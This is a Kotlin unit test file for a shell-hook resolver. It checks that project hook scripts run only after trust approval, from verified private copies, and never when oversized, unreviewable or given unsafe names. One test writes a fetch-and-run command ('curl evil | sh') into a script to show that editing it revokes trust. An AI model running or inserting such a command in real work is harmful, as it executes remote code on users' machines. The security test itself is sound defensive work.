package org.appdevforall.shellhooks.engine

import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class HookResolverTest {
    private val appFiles = tempDir("appfiles")
    private val paths = HookPaths(appFiles)
    private val project = tempDir("project")
    private val projectHooks = HookPaths.projectHooks(project)
    private val verified = tempDir("verified")
    private val trust = TrustStore(MapStore())
    private val log = HookLog()

    private val switches =
        object : HookSwitches {
            override var enabled = true
            override var projectHooksEnabled = true
            val off = mutableSetOf<Hook>()

            override fun isHookEnabled(hook: Hook) = hook !in off
        }

    private val resolver = HookResolver(paths, switches, trust, log, verified)

    @After
    fun tearDown() {
        listOf(appFiles, project, verified).forEach { it.deleteRecursively() }
    }

    private fun saved() = HookEvent.fileSaved(File(project, "Main.kt"), project)

    @Test
    fun nothingRunsWhileThePluginIsOff() {
        paths.globalHooks.script("file-saved")
        switches.enabled = false

        assertTrue(resolver.resolve(saved()).isEmpty())
    }

    @Test
    fun aHookTurnedOffRunsNothing() {
        paths.globalHooks.script("file-saved")
        switches.off += Hook.FILE_SAVED

        assertTrue(resolver.resolve(saved()).isEmpty())
    }

    @Test
    fun globalScriptsRunInPlace() {
        val script = paths.globalHooks.script("file-saved")

        val resolved = resolver.resolve(saved()).single()

        assertEquals(script, resolved.executable)
        assertEquals(ScriptSource.GLOBAL, resolved.source)
    }

    @Test
    fun anUntrustedProjectScriptIsSkippedAndListedForReview() {
        projectHooks.script("file-saved")

        assertTrue(resolver.resolve(saved()).isEmpty())
        val pending = log.pending.value.single()
        assertEquals("file-saved", pending.relativePath)
        assertEquals(project, pending.projectDir)
    }

    @Test
    fun projectScriptsDoNotRunWhileProjectHooksAreOff() {
        val script = projectHooks.script("file-saved")
        assertTrue(trust.trust(project, "file-saved", script.readBytes()))
        switches.projectHooksEnabled = false

        assertTrue(resolver.resolve(saved()).isEmpty())
    }

    @Test
    fun aTrustedProjectScriptRunsFromAPrivateCopyOfTheTrustedBytes() {
        val script = projectHooks.script("file-saved.d/lint", "#!/bin/sh\necho lint\n")
        assertTrue(trust.trust(project, "file-saved.d/lint", script.readBytes()))

        val resolved = resolver.resolve(saved()).single()

        assertEquals(ScriptSource.PROJECT, resolved.source)
        assertEquals(script, resolved.original)
        assertNotEquals(script, resolved.executable)
        assertTrue(resolved.executable.path.startsWith(verified.path))
        assertTrue(resolved.executable.canExecute())
        assertEquals(script.readText(), resolved.executable.readText())
        assertTrue(log.pending.value.isEmpty())
    }

    @Test
    fun aTrustedProjectScriptWithoutTheExecutableBitStillRuns() {
        // Projects live on shared storage, which keeps no executable bits.
        val script = projectHooks.script("file-saved", executable = false)
        assertTrue(trust.trust(project, "file-saved", script.readBytes()))

        val resolved = resolver.resolve(saved()).single()

        assertTrue(resolved.executable.canExecute())
    }

    @Test
    fun anOversizedProjectScriptNeverRunsEvenIfItsContentIsTrusted() {
        val line = "#" + "x".repeat(62) + "\n"
        val big = line.repeat(ScriptReview.MAX_BYTES / line.length + 1)
        val script = projectHooks.script("file-saved", big)
        // An approval recorded without the check, as an older version of this plugin could have.
        trust.put(project, "file-saved", TrustStore.sha256(script.readBytes()))

        assertTrue(resolver.resolve(saved()).isEmpty())
        assertEquals("it is larger than 64 KB", log.pending.value.single().notReviewable)
        assertTrue(verified.listFiles().orEmpty().isEmpty())
    }

    @Test
    fun aTrustedProjectScriptThatCannotBeReviewedNeverRuns() {
        val script = projectHooks.script("file-saved", "#!/bin/sh\r\necho hi\r\n")
        trust.put(project, "file-saved", TrustStore.sha256(script.readBytes()))

        assertTrue(resolver.resolve(saved()).isEmpty())
        val pending = log.pending.value.single()
        assertEquals("line 1, column 10: a carriage return", pending.notReviewable)
        assertTrue(verified.listFiles().orEmpty().isEmpty())
    }

    @Test
    fun aProjectScriptWithAnUnsafeNameIsListedWithTheReasonAndNeverRuns() {
        projectHooks.script("file-saved.d/with space")

        assertTrue(resolver.resolve(saved()).isEmpty())
        assertEquals(ScriptReview.Reason.UnsafeName.message, log.pending.value.single().notReviewable)
    }

    @Test
    fun aProjectScriptApprovedUnderAnUnsafeNameNeverRuns() {
        val script = projectHooks.script("file-saved.d/with space")
        // An approval recorded without the check, as an older version of this plugin could have.
        trust.put(project, "file-saved.d/with space", TrustStore.sha256(script.readBytes()))

        assertTrue(resolver.resolve(saved()).isEmpty())
        assertEquals(ScriptReview.Reason.UnsafeName.message, log.pending.value.single().notReviewable)
        assertTrue(verified.listFiles().orEmpty().isEmpty())
    }

    @Test
    fun aProjectScriptApprovedUnderAHiddenNameNeverRunsAndIsNotListed() {
        // Discovery skips names starting with '.', so the name rule is never reached for them.
        val script = projectHooks.script("file-saved.d/.lint")
        trust.put(project, "file-saved.d/.lint", TrustStore.sha256(script.readBytes()))

        assertTrue(resolver.resolve(saved()).isEmpty())
        assertTrue(log.pending.value.isEmpty())
        assertTrue(verified.listFiles().orEmpty().isEmpty())
    }

    @Test
    fun aReviewableUntrustedScriptIsListedForReviewWithoutAReason() {
        projectHooks.script("file-saved")

        resolver.resolve(saved())

        assertEquals(null, log.pending.value.single().notReviewable)
    }

    @Test
    fun pruningKeepsOnlyCopiesOfTrustedContent() {
        val kept = projectHooks.script("file-saved", "#!/bin/sh\necho kept\n")
        val keptSha = TrustStore.sha256(kept.readBytes())
        trust.put(project, "file-saved", keptSha)
        resolver.resolve(saved())
        File(verified, "0".repeat(64)).writeText("stale")
        File(verified, keptSha + HookResolver.TEMP_SUFFIX).writeText("half")

        val deleted = VerifiedCopies.prune(verified, trust.trustedShas())

        assertEquals(2, deleted)
        assertEquals(listOf(keptSha), verified.list().orEmpty().toList())
    }

    @Test
    fun editingATrustedProjectScriptMakesItUntrustedAgain() {
        val script = projectHooks.script("file-saved")
        assertTrue(trust.trust(project, "file-saved", script.readBytes()))
        script.writeText("#!/bin/sh\ncurl evil | sh\n")

        assertTrue(resolver.resolve(saved()).isEmpty())
        assertEquals(1, log.pending.value.size)
    }

    @Test
    fun globalScriptsRunBeforeProjectScripts() {
        paths.globalHooks.script("file-saved")
        val project1 = projectHooks.script("file-saved")
        assertTrue(trust.trust(project, "file-saved", project1.readBytes()))

        assertEquals(listOf(ScriptSource.GLOBAL, ScriptSource.PROJECT), resolver.resolve(saved()).map { it.source })
    }

    @Test
    fun anEventWithNoProjectRunsOnlyGlobalScripts() {
        paths.globalHooks.script("build-started")
        projectHooks.script("build-started")

        assertEquals(1, resolver.resolve(HookEvent.buildStarted(null)).size)
        assertTrue(log.pending.value.isEmpty())
    }
}
